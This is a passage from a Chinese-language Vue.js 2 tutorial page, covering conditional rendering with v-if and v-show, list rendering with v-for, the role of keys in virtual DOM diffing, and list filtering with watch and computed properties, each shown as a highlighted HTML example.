class="javascript">name:<span class="string">&#x27;电信学院&#x27;</span>,</span></span><br><span class="line"><span class="javascript">mood:<span class="string">&#x27;normal&#x27;</span>,</span></span><br><span class="line"><span class="javascript">classArr:[<span class="string">&#x27;atguigu1&#x27;</span>,<span class="string">&#x27;atguigu2&#x27;</span>,<span class="string">&#x27;atguigu3&#x27;</span>],</span></span><br><span class="line">classObj:&#123;</span><br><span class="line"><span class="javascript">atguigu1:<span class="literal">false</span>,</span></span><br><span class="line"><span class="javascript">atguigu2:<span class="literal">false</span>,</span></span><br><span class="line">&#125;,</span><br><span class="line">styleObj1:&#123;</span><br><span class="line"><span class="javascript">fontSize:<span class="string">&#x27;40px&#x27;</span>,</span></span><br><span class="line"><span class="javascript">color:<span class="string">&#x27;red&#x27;</span></span></span><br><span class="line">&#125;,</span><br><span class="line">styleObj2:&#123;</span><br><span class="line"><span class="javascript">backgroundColor:<span class="string">&#x27;orange&#x27;</span></span></span><br><span class="line">&#125;,</span><br><span class="line">styleArr:[</span><br><span class="line">&#123;</span><br><span class="line"><span class="javascript">fontSize:<span class="string">&#x27;40px&#x27;</span>,</span></span><br><span class="line"><span class="javascript">color:<span class="string">&#x27;green&#x27;</span></span></span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line"><span class="javascript">backgroundColor:<span class="string">&#x27;orange&#x27;</span></span></span><br><span class="line">&#125;</span><br><span class="line">]</span><br><span class="line">&#125;,</span><br><span class="line">methods:&#123;</span><br><span class="line"><span class="javascript"><span class="comment">//changeMood()&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//this.mood = &#x27;happy&#x27;</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="function"><span class="title">changeMood</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> arr = [<span class="string">&#x27;happy&#x27;</span>,<span class="string">&#x27;sad&#x27;</span>,<span class="string">&#x27;normal&#x27;</span>]</span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> index = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random()*<span class="number">3</span>)</span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.mood = arr[index]</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="19-条件渲染"><a href="#19-条件渲染" class="headerlink" title="19.条件渲染"></a>19.条件渲染</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>条件渲染<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">条件渲染：</span></span><br><span class="line"><span class="comment">1.v-if</span></span><br><span class="line"><span class="comment">写法：</span></span><br><span class="line"><span class="comment">（1）v-if=&quot;表达式&quot;；</span></span><br><span class="line"><span class="comment">（1）v-else-if=&quot;表达式&quot;；</span></span><br><span class="line"><span class="comment">（1）v-else=&quot;表达式&quot;；</span></span><br><span class="line"><span class="comment">适用于：切换频率较低的场景；</span></span><br><span class="line"><span class="comment">特点：不展示DOM元素直接被移除；</span></span><br><span class="line"><span class="comment">注意：v-if可以和v-else-if、v-else一起使用，但要求结构不能被“打断”。</span></span><br><span class="line"><span class="comment">2.v-show</span></span><br><span class="line"><span class="comment">写法：v-show=&quot;表达式&quot;；</span></span><br><span class="line"><span class="comment">适用于：切换频率较高的场景；</span></span><br><span class="line"><span class="comment">特点：不展示DOM元素未被移除，仅仅是使用样式隐藏掉；</span></span><br><span class="line"><span class="comment">注意：v-if可以和v-else-if、v-else一起使用，但要求结构不能被“打断”。</span></span><br><span class="line"><span class="comment">3.备注：</span></span><br><span class="line"><span class="comment">使用v-if时，元素可能无法被获取到，而使用v-show一定能获取到元素。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>当前的n值是：&#123;&#123;n&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;n++&quot;</span>&gt;</span>点我n+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--使用v-show指令做条件渲染--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;h2 v-show=&quot;false&quot;&gt;欢迎来到&#123;&#123;name&#125;&#125;&lt;/h2&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;h2 v-show=&quot;1 === 1&quot;&gt;欢迎来到&#123;&#123;name&#125;&#125;&lt;/h2&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--使用v-if指令做条件渲染--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;h2 v-if=&quot;false&quot;&gt;欢迎来到&#123;&#123;name&#125;&#125;&lt;/h2&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;h2 v-if=&quot;1 === 1&quot;&gt;欢迎来到&#123;&#123;name&#125;&#125;&lt;/h2&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--&lt;h2 v-show=&quot;n === 1&quot;&gt;java&lt;/h2&gt;</span></span><br><span class="line"><span class="comment">&lt;h2 v-show=&quot;n === 2&quot;&gt;spring&lt;/h2&gt;</span></span><br><span class="line"><span class="comment">&lt;h2 v-show=&quot;n === 3&quot;&gt;springBoot&lt;/h2&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--&lt;h2 v-if=&quot;n === 1&quot;&gt;java&lt;/h2&gt;</span></span><br><span class="line"><span class="comment">&lt;h2 v-if=&quot;n === 1&quot;&gt;spring&lt;/h2&gt;</span></span><br><span class="line"><span class="comment">&lt;h2 v-if=&quot;n === 3&quot;&gt;springBoot&lt;/h2&gt;</span></span><br><span class="line"><span class="comment">&lt;hr /&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--使用v-else-if和v-else指令做条件渲染--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;h2 v-if=&quot;n === 1&quot;&gt;java&lt;/h2&gt;</span></span><br><span class="line"><span class="comment">&lt;h2 v-else-if=&quot;n === 1&quot;&gt;spring&lt;/h2&gt;</span></span><br><span class="line"><span class="comment">&lt;h2 v-else-if=&quot;n === 3&quot;&gt;springBoot&lt;/h2&gt;</span></span><br><span class="line"><span class="comment">&lt;h2 v-else&gt;默认值&lt;/h2&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!--v-if与template的配合使用--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">v-if</span>=<span class="string">&quot;n === 1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>java<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>spring<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>springBoot<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;电信学院&#x27;</span>,</span></span><br><span class="line">n:0,</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="20-列表渲染-基本列表"><a href="#20-列表渲染-基本列表" class="headerlink" title="20.列表渲染-基本列表"></a>20.列表渲染-基本列表</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>列表渲染-基本列表<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">v-for指令：</span></span><br><span class="line"><span class="comment">1.用于展示列表数据；</span></span><br><span class="line"><span class="comment">2.语法 v-for=&quot;(item,index) in xxx&quot; :key=&quot;yyy&quot;。（in可以改为for）</span></span><br><span class="line"><span class="comment">3.可遍历数组、对象、字符串（很少用）、指定次数（很少用）。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--遍历数组类型数据--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>人员列表<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;li v-for=&quot;p in persons&quot; :key=&quot;p.id&quot;&gt;</span></span><br><span class="line"><span class="comment">&#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;</span></span><br><span class="line"><span class="comment">&lt;/li&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(p,index) in persons&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&#123;&#123;p&#125;&#125;---&#123;&#123;index&#125;&#125;--&gt;</span></span><br><span class="line">&#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--遍历对象类型数据--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>汽车信息<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(value,key) in car&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;key&quot;</span>&gt;</span></span><br><span class="line">&#123;&#123;key&#125;&#125;-&#123;&#123;value&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--遍历字符串类型数据--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>遍历字符串<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(a,b) in str&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;b&quot;</span>&gt;</span></span><br><span class="line">&#123;&#123;a&#125;&#125;-&#123;&#123;b&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--遍历指定次数--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>遍历字符串<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(a,b) in 5&quot;</span>&gt;</span></span><br><span class="line">&#123;&#123;a&#125;&#125;-&#123;&#123;b&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line">persons:[</span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="attr">age</span>:<span class="number">18</span>&#125;,</span></span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;002&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;王五&#x27;</span>,<span class="attr">age</span>:<span class="number">28</span>&#125;,</span></span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;003&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;李四&#x27;</span>,<span class="attr">age</span>:<span class="number">48</span>&#125;,</span></span><br><span class="line">],</span><br><span class="line">car:&#123;</span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;奥迪A8&#x27;</span>,</span></span><br><span class="line"><span class="javascript">price:<span class="string">&#x27;70万&#x27;</span>,</span></span><br><span class="line"><span class="javascript">color:<span class="string">&#x27;灰色&#x27;</span></span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="javascript">str:<span class="string">&#x27;hello&#x27;</span></span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="21-列表渲染-key的原理"><a href="#21-列表渲染-key的原理" class="headerlink" title="21.列表渲染-key的原理"></a>21.列表渲染-key的原理</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>列表渲染-key的原理<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">面试题：react、vue中的key有什么作用？（key内部原理）</span></span><br><span class="line"><span class="comment">1.虚拟DOM中key的作用：</span></span><br><span class="line"><span class="comment">key是虚拟对象的标识，当状态中的数据发生变化时，Vue会根据“新数据”生成“新的虚拟DOM”，</span></span><br><span class="line"><span class="comment">跟随Vue进行“新虚拟DOM”与“旧虚拟DOM”的差异比较，比较规则如下：</span></span><br><span class="line"><span class="comment">2.对比规则：</span></span><br><span class="line"><span class="comment">(1).旧虚拟DOM中找到了与新虚拟DOM相同的key：</span></span><br><span class="line"><span class="comment">①.若虚拟DOM中内容没变，直接使用之前的真实DOM；</span></span><br><span class="line"><span class="comment">②.若虚拟DOM中内容变了，则生成新的真实DOM，随后替换掉页面中之前的真实DOM；</span></span><br><span class="line"><span class="comment">(2).旧虚拟DOM中未找到了与新虚拟DOM相同的key：</span></span><br><span class="line"><span class="comment">创建新的真实DOM，随后渲染到页面。</span></span><br><span class="line"><span class="comment">3.用index作为key可能会引发的问题：</span></span><br><span class="line"><span class="comment">(1).若对数据进行：逆序添加、逆序删除等破坏顺序操作，会产生没有必要的真实DOM更新==&gt;界面效果没问题，但效率低；</span></span><br><span class="line"><span class="comment">(2).如果结构中还包含输入类的DOM，会产生错误DOM更新==&gt;界面问题；</span></span><br><span class="line"><span class="comment">4.开发中如何选择key：</span></span><br><span class="line"><span class="comment">(1).最好使用每条数据的唯一标识作为key，比如id、手机号、身份证号、学号等唯一值；</span></span><br><span class="line"><span class="comment">(2).如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key是没问题的；</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--遍历数组类型数据--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>人员列表<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;add&quot;</span>&gt;</span>添加一个人<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(p,index) in persons&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;p.id&quot;</span>&gt;</span></span><br><span class="line">&#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line">persons:[</span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="attr">age</span>:<span class="number">18</span>&#125;,</span></span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;002&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;王五&#x27;</span>,<span class="attr">age</span>:<span class="number">28</span>&#125;,</span></span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;003&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;李四&#x27;</span>,<span class="attr">age</span>:<span class="number">48</span>&#125;,</span></span><br><span class="line">]</span><br><span class="line">&#125;,</span><br><span class="line">methods: &#123;</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">add</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> p = &#123;<span class="attr">id</span>:<span class="string">&#x27;004&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;老刘&#x27;</span>,<span class="attr">age</span>:<span class="number">68</span>&#125;</span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.persons.unshift(p)</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="22-列表过滤"><a href="#22-列表过滤" class="headerlink" title="22.列表过滤"></a>22.列表过滤</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>列表过滤<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--遍历数组类型数据--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>人员列表<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入搜索名字&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;keyWord&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(p,index) in filterPersons&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;-&#123;&#123;p.sex&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//使用watch监视实现</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//#region</span></span></span><br><span class="line">/*new Vue(&#123;</span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">keyWord:<span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line">persons:[</span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;马冬梅&#x27;</span>,<span class="attr">age</span>:<span class="number">18</span>,<span class="attr">sex</span>:<span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;002&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;周冬雨&#x27;</span>,<span class="attr">age</span>:<span class="number">28</span>,<span class="attr">sex</span>:<span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;003&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;周杰伦&#x27;</span>,<span class="attr">age</span>:<span class="number">38</span>,<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;003&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;邓伦&#x27;</span>,<span class="attr">age</span>:<span class="number">28</span>,<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>&#125;,</span></span><br><span class="line">],</span><br><span class="line">filterPersons:[]</span><br><span class="line">&#125;,</span><br><span class="line">watch:&#123;</span><br><span class="line"><span class="javascript"><span class="comment">//监视keyWord属性是否改变</span></span></span><br><span class="line">keyWord:&#123;</span><br><span class="line"><span class="javascript">immediate:<span class="literal">true</span>,</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="title">handler</span>(<span class="params">value</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="comment">//属性改变就过滤数组</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.filterPersons = <span class="built_in">this</span>.persons.filter(<span class="function">(<span class="params">p</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="comment">//过滤name属性中包含value相同字符串的数据</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> p.name.indexOf(value) !== -<span class="number">1</span></span></span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)*/</span><br><span class="line"><span class="javascript"><span class="comment">//#endregion</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="comment">//使用computed计算属性实现</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">keyWord:<span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line">persons:[</span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;马冬梅&#x27;</span>,<span class="attr">age</span>:<span class="number">18</span>,<span class="attr">sex</span>:<span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;002&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;周冬雨&#x27;</span>,<span class="attr">age</span>:<span class="number">28</span>,<span class="attr">sex</span>:<span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;003&#x27;</span>,<span class="attr">name</span>:<span 